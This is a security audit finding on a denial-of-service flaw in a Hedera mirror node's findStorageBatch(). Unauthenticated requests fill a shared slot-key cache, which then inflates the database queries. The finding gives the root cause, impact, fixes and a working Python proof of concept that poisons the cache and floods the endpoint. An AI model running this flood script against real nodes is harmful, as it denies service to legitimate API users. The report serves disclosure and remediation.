### Title
Cache-Amplified DB Read DoS via Shared Per-Contract Slot Key Cache in `findStorageBatch()`

### Summary
`ContractStateServiceImpl.findStorageBatch()` issues a single DB query containing **all** slot keys currently cached for a given contract, not just the one being requested. Because the slot-key cache is shared across all users and populated by any unauthenticated request, an attacker can pre-fill the per-contract slot key cache to its maximum size (1500 entries by default), then repeatedly trigger queries with a 1500-slot `IN` clause — amplifying DB read load by up to 1500× per request. Combined with the 2-second value-cache TTL, this creates a sustained, repeatable amplification primitive requiring no privileges.

**Root cause and failed assumption:**

The design assumes that batch-loading previously seen slot keys is a net performance win. The failed assumption is that the slot-key cache is populated only by legitimate, organic traffic. In reality, any unauthenticated caller can inject arbitrary slot keys into the shared per-contract cache, and those keys persist for 5 minutes (`expireAfterAccess=5m`). [3](#0-2) 

**Exploit flow:**

1. **Phase 1 — Cache poisoning**: Attacker sends 1500 `eth_getStorageAt` (or `eth_call`) requests for a target contract, each with a distinct, fabricated slot key. Each request reaches `findStorageBatch()`, which calls `contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE)` and adds the key to the per-contract Caffeine cache. After 1500 requests the cache is at its default `maximumSize=1500`. [3](#0-2) 

2. **Phase 2 — Value-cache expiry**: The `contractStateCache` has `expireAfterWrite=2s`. After 2 seconds all previously fetched values expire. The slot-key cache is unaffected (5-minute TTL). [4](#0-3) 

3. **Phase 3 — Amplified queries**: Any subsequent request for the target contract (attacker or victim) finds no value in `contractStateCache`, falls through to `findStorageBatch()`, and issues a DB query with all 1500 cached slot keys. The attacker repeats this at the allowed rate (default 500 req/s), generating up to 500 × 1500 = 750,000 slot lookups per second against the DB. [5](#0-4) 

### Impact Explanation

The DB query `SELECT … WHERE contract_id = X AND slot IN (1500 values)` is orders of magnitude more expensive than a single-slot lookup. Under sustained attack the PostgreSQL backend saturates, causing query timeouts (default `statementTimeout=3000ms`) and connection pool exhaustion. This degrades or completely denies service for all web3 API callers (`eth_call`, `eth_getStorageAt`, `eth_estimateGas`, etc.). The mirror node's web3 API becomes unavailable. Note: the Hedera consensus network itself is unaffected — the mirror node is read-only and not a consensus participant.

### Likelihood Explanation

- **No authentication required**: the web3 JSON-RPC endpoint is public.
- **Low cost**: 1500 HTTP requests to poison the cache; trivially scriptable.
- **Repeatable**: the value cache expires every 2 seconds, so the amplification window is continuous as long as the attacker keeps the slot-key cache warm (one access per key per 5 minutes suffices).
- **Targeted**: the attacker can focus on a single high-traffic contract to maximize collateral damage to legitimate users.
- **No rate-limit bypass needed**: the default 500 req/s limit is sufficient to sustain the attack; the amplification happens server-side. [6](#0-5) 

### Recommendation

1. **Scope the batch query to recently-requested keys only**, not the entire per-contract cache. Maintain a per-request or per-session set of slot keys rather than a global shared set.
2. **Separate attacker-controlled keys from organic keys**: only include a slot key in the batch if it has been successfully resolved from the DB at least once (i.e., it has a real value). Keys that returned no DB row should not be retained in `contractSlotsCache`.
3. **Cap the batch size per query** with an explicit upper bound (e.g., 50–100 slots) regardless of cache size, and page the remainder.
4. **Rate-limit per source IP** at the API gateway layer before requests reach the caching layer.
5. As an immediate mitigation, reduce `slotsPerContract.maximumSize` to a small value (e.g., 50) and consider setting `enableBatchContractSlotCaching=false` until the design is hardened. [7](#0-6) 

### Proof of Concept

```python
import requests, random

TARGET = "http://<mirror-node-host>:8545"
CONTRACT = "0x<target_contract_address>"

# Phase 1: poison the slot-key cache with 1500 distinct fabricated slots
for i in range(1500):
    slot = hex(random.getrandbits(256))   # random non-existent slot
    requests.post(TARGET, json={
        "jsonrpc": "2.0", "method": "eth_getStorageAt",
        "params": [CONTRACT, slot, "latest"], "id": i
    })

# Phase 2: wait for contractStateCache to expire (2 s)
import time; time.sleep(3)

# Phase 3: flood with any slot — each request triggers a 1500-slot DB query
import threading
def flood():
    while True:
        requests.post(TARGET, json={
            "jsonrpc": "2.0", "method": "eth_getStorageAt",
            "params": [CONTRACT, "0x0", "latest"], "id": 1
        })

for _ in range(50):
    threading.Thread(target=flood, daemon=True).start()

time.sleep(60)   # observe DB CPU/connection saturation
```

Each iteration of the flood loop causes the server to execute `SELECT slot, value FROM contract_state WHERE contract_id = X AND slot IN (<1500 entries>)`, saturating the DB with amplified read load.

    private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
        final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
                contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
        final var wrappedKey = ByteBuffer.wrap(key);
        // Cached slot keys for contract, whose slot values are not present in the contractStateCache
        contractSlotsCache.putIfAbsent(wrappedKey, EMPTY_VALUE);
        final var cachedSlotKeys = contractSlotsCache.getNativeCache().asMap().keySet();

        final var cachedSlots = new ArrayList<byte[]>(cachedSlotKeys.size());
        boolean isKeyEvictedFromCache = true;

        for (var slot : cachedSlotKeys) {
            cachedSlots.add(((ByteBuffer) slot).array());
            if (wrappedKey.equals(slot)) {
                isKeyEvictedFromCache = false;
            }
        }

        final var contractSlotValues = contractStateRepository.findStorageBatch(contractId.getId(), cachedSlots);
